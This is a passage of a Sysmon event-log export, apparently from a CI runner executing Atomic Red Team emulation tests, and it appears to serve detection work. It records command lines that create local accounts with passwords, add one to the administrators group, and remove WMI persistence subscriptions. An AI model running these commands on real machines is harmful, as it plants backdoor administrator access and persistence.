User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-6387-6942-a805-000000000e00}
ParentProcessId: 7912
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  localgroup administrators ""T1136.001_Admin"" /add
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.185
ProcessGuid: {f995aebf-6387-6942-a805-000000000e00}
ProcessId: 7912
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  localgroup administrators ""T1136.001_Admin"" /add
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-6387-6942-a405-000000000e00}
ParentProcessId: 1748
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /add ""T1136.001_Admin"" ""T1136_pass"" & net localgroup administrators ""T1136.001_Admin"" /add
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:15.104
ProcessGuid: {f995aebf-6387-6942-a705-000000000e00}
ProcessId: 3512
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.094
ProcessGuid: {f995aebf-6387-6942-a705-000000000e00}
ProcessId: 3512
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user /add ""T1136.001_Admin"" ""T1136_pass"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-6387-6942-a605-000000000e00}
ParentProcessId: 7948
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user /add ""T1136.001_Admin"" ""T1136_pass"" 
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.085
ProcessGuid: {f995aebf-6387-6942-a605-000000000e00}
ProcessId: 7948
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /add ""T1136.001_Admin"" ""T1136_pass"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-6387-6942-a405-000000000e00}
ParentProcessId: 1748
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /add ""T1136.001_Admin"" ""T1136_pass"" & net localgroup administrators ""T1136.001_Admin"" /add
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:15 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:15.062
ProcessGuid: {f995aebf-6387-6942-a405-000000000e00}
ProcessId: 1748
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /add ""T1136.001_Admin"" ""T1136_pass"" & net localgroup administrators ""T1136.001_Admin"" /add
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:12.589
ProcessGuid: {f995aebf-6384-6942-9a05-000000000e00}
ProcessId: 8044
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:14.562
ProcessGuid: {f995aebf-6386-6942-a205-000000000e00}
ProcessId: 612
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_1qyihl5e.qhq.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:14.469
ProcessGuid: {f995aebf-6386-6942-a205-000000000e00}
ProcessId: 612
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {New-LocalUser -Name \""""T1136.001_PowerShell\"""" -NoPassword}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","7","Image loaded:
RuleName: ImageLoad
UtcTime: 2025-12-17 08:02:14.207
ProcessGuid: {f995aebf-6386-6942-a105-000000000e00}
ProcessId: 3756
Image: C:\Windows\System32\net1.exe
ImageLoaded: C:\Windows\System32\samlib.dll
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: SAM Library DLL
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: SAMLib.DLL
Hashes: SHA256=13B0BB662EE434ED5CEE876D95886F4FB5E77C636E7DC645CD7E9BE634665497
Signed: true
Signature: Microsoft Windows
SignatureStatus: Valid
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:14.197
ProcessGuid: {f995aebf-6386-6942-a105-000000000e00}
ProcessId: 3756
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1  user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8489DB35375D890314EB8F7CD9E0CBD3866475F4E252865F00F649B0A02FD757
ParentProcessGuid: {f995aebf-6386-6942-a005-000000000e00}
ParentProcessId: 3516
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: net  user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:14.172
ProcessGuid: {f995aebf-6386-6942-a005-000000000e00}
ProcessId: 3516
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: net  user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=BB3E638C8B5B6EF80847E364AEEF2796CAD25D3539CF9B41D3820FA48943E777
ParentProcessGuid: {f995aebf-6386-6942-9e05-000000000e00}
ParentProcessId: 2132
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c net user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:14.149
ProcessGuid: {f995aebf-6386-6942-9e05-000000000e00}
ProcessId: 2132
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c net user /add ""T1136.001_CMD"" ""T1136.001_CMD!""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:13.947
ProcessGuid: {f995aebf-6385-6942-9d05-000000000e00}
ProcessId: 8232
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:13.929
ProcessGuid: {f995aebf-6385-6942-9c05-000000000e00}
ProcessId: 7056
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:12.032
ProcessGuid: {f995aebf-6383-6942-9805-000000000e00}
ProcessId: 1164
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:13 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 08:02:11.485
ProcessGuid: {f995aebf-6383-6942-9605-000000000e00}
ProcessId: 6744
QueryName: localhost
QueryStatus: 0
QueryResults: 127.0.0.1;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:12 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:12.633
Operation: Deleted
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\subscription""
Name:  ""AtomicRedTeam_filter""
Query:  ""SELECT * FROM __InstanceCreationEvent Within 3 Where TargetInstance Isa \""Win32_Process\"" And Targetinstance.Name = \""notepad.exe\"" """
"12/17/2025 8:02:12 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:12.633
Operation: Deleted
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam_consumer""
Type: Command Line
Destination:  ""cmd.exe"""
"12/17/2025 8:02:12 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:12.631
Operation: Deleted
User: runnervm8j6r3\runneradmin
Consumer:  ""\\\\.\\root\\subscription:CommandLineEventConsumer.Name=\""AtomicRedTeam_consumer\""""
Filter:  ""\\\\.\\root\\subscription:__EventFilter.Name=\""AtomicRedTeam_filter\"""""
"12/17/2025 8:02:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:12.386
ProcessGuid: {f995aebf-6384-6942-9a05-000000000e00}
ProcessId: 8044
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_exjt05z4.0tk.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:12 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:12.076
Operation: Deleted
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\CimV2""
Name:  ""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example""
Query:  ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"""
"12/17/2025 8:02:12 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:12.074
Operation: Deleted
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example""
Type: Script
Destination:  ""\n Set objws = CreateObject(\""Wscript.Shell\"")\n objws.Run \""notepad.exe\"", 0, True\n """
"12/17/2025 8:02:12 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:12.074
Operation: Deleted
User: runnervm8j6r3\runneradmin
Consumer:  ""ActiveScriptEventConsumer.Name=\""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example\""""
Filter:  ""__EventFilter.Name=\""AtomicRedTeam-WMIPersistence-ActiveScriptEventConsumer-Example\"""""
"12/17/2025 8:02:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:11.832
ProcessGuid: {f995aebf-6383-6942-9805-000000000e00}
ProcessId: 1164
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_lwb4bpyh.wm5.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:11 AM","19","WmiEventFilter activity detected:
RuleName: WmiEvent
EventType: WmiFilterEvent
UtcTime: 2025-12-17 08:02:11.526
Operation: Deleted
User: runnervm8j6r3\runneradmin
EventNamespace:  ""root\\CimV2""
Name:  ""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example""
Query:  ""SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"""
"12/17/2025 8:02:11 AM","20","WmiEventConsumer activity detected:
RuleName: WmiEvent
EventType: WmiConsumerEvent
UtcTime: 2025-12-17 08:02:11.526
Operation: Deleted
User: runnervm8j6r3\runneradmin
Name:  ""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example""
Type: Command Line
Destination:  ""C:\\Windows\\System32\\notepad.exe"""
"12/17/2025 8:02:11 AM","21","WmiEventConsumerToFilter activity detected:
RuleName: WmiEvent
EventType: WmiBindingEvent
UtcTime: 2025-12-17 08:02:11.524
Operation: Deleted
User: runnervm8j6r3\runneradmin
Consumer:  ""\\\\.\\ROOT\\subscription:CommandLineEventConsumer.Name=\""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example\""""
Filter:  ""\\\\.\\ROOT\\subscription:__EventFilter.Name=\""AtomicRedTeam-WMIPersistence-CommandLineEventConsumer-Example\"""""
"12/17/2025 8:02:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:02:11.287
ProcessGuid: {f995aebf-6383-6942-9605-000000000e00}
ProcessId: 6744
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_fj2eskln.y21.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:02:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:11.031
ProcessGuid: {f995aebf-6383-6942-9505-000000000e00}
ProcessId: 1368
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:02:11.011
ProcessGuid: {f995aebf-6383-6942-9405-000000000e00}
ProcessId: 8736
Image: C:\Windows\System32\HOSTNAME.EXE
FileVersion: 10.0.26100.2161 (WinBuild.160101.0800)
Description: Hostname APP
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: hostname.exe
CommandLine: ""C:\Windows\system32\HOSTNAME.EXE""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-59f4-6942-4710-0c0000000000}
LogonId: 0xC1047
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=8FF283FB7A282A9B2B30235016669DFE795665BCBB254FD17AC31FA9308D89D9
ParentProcessGuid: {f995aebf-60ec-6942-0703-000000000e00}
ParentProcessId: 3536
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\8efd10a8-1763-436a-930a-0032ad72e967.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:02:06 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:02:06.615
ProcessGuid: {f995aebf-637e-6942-9105-000000000e00}
ProcessId: 5940
Image: C:\windows\system32\wbem\mofcomp.exe
TargetFilename: C:\Windows\System32\wbem\AutoRecover\BE941EED73FA65C764857930E033B541.mof
CreationUtcTime: 2025-12-17 08:02:06.615
User: runnervm8j6r3\runneradmin"
